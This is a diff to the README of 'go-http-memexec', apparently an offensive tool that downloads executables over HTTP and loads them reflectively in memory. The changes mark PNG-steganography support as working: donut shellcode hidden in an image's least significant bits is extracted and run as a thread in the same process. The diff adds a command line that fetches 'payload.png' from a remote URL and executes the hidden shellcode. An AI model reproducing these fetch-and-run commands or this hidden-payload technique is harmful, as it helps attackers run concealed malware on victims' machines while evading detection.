@@ -27,8 +27,7 @@ go http memexec uses a sophisticated reflective PE loading technique to run exec
 5. Handles TLS callbacks properly
 6. For EXEs: Executes the payload by jumping to its entry point
 7. For DLLs: Calls DllMain with DLL_PROCESS_ATTACH and lets you call exported functions
-8. (in development, working just need to share the embedder) 
-For PNGs: Extracts the embedded donut shellcode from the PNG and runs it as a thread under the same PID
+8. For PNGs: Extracts the embedded donut shellcode from the PNG and runs it as a thread under the same PID
 
 ## Usage
 
@@ -53,6 +52,9 @@ For PNGs: Extracts the embedded donut shellcode from the PNG and runs it as a th
 
 # Extract and execute PE from PNG image
 ./go-http-memexec -image https://example.com/payload.png
+
+# Extract and execute donut shellcode from PNG image
+./go-http-memexec -image -shellcode https://example.com/payload.png
 ```
 
 ## Use Cases
@@ -136,7 +138,7 @@ The `-image` flag enables extraction and execution of PE files embedded in PNG i
 - PE files are embedded using the included `embedPEpng` tool
 - The embedding uses LSB (Least Significant Bit) steganography
 - The tool automatically detects and extracts the PE file from the PNG
-- After extraction, the PE is executed according to its type (EXE or DLL)
+- After extraction, the PE is executed according to its type (EXE or shellcode)
 
 ### Using the embedPEpng Tool
 
